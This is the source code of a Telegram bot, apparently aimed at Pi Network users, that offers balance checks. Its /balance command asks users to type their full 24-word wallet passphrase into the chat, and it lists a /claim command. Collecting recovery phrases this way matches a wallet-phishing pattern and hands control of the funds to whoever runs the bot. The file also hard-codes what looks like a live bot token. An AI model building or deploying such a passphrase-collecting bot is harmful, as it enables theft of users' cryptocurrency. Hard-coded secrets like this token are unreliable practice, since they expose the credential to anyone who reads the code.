import TelegramBot from "node-telegram-bot-api";
import { getAccountWithoutProxy, getBalance, getKeypairFromPassphrase } from "./utils/fn.js";

const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
console.log('Bot is running')



const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Welcome to PiBot! Type /help to see commandsss.");
})

bot.onText(/\/help/, (msg) => {
    const helpText = `
        📘 PiBot Commands:
        /balance - Show Pi balance
        /claim - Claim unlocked Pi
        /status - Check bot status
        `;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

const userSessions = {};

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space)');

    userSessions[chatId] = { waitingForPassphrase: true }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if(userSessions[chatId]?.waitingForPassphrase) {
        const passphrase = msg.text.trim().toLocaleLowerCase();

        const words = passphrase.split(/\s+/);
        if(words.length !== 24) {
            return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
        }

        bot.sendMessage(chatId, '⏳ Checking Balance...');

        try {
            const kp = getKeypairFromPassphrase(passphrase)
            bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);

            const accountData = await getAccountWithoutProxy(kp.publicKey());
            const balanceString = getBalance(accountData);
            const balance = parseFloat(balanceString) - 0.98;
            bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
        } catch(error) {
            bot.sendMessage(chatId, `❌ Failed to fetch balance. Please try again`);
        }

        delete userSessions[chatId]
    }
})